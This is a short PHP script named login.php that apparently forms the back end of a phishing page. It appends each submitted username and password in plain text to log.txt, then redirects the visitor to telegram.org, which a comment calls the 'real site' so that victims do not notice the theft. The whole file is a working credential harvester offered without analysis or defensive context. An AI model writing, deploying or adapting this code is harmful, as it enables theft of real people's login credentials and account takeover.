<?php
// login.php
file_put_contents("log.txt", "User: ".$_POST['username']." | Pass: ".$_POST['password']."\n", FILE_APPEND);
echo "Redirecting...";
header("Location: https://telegram.org"); // redirect to real site
?>
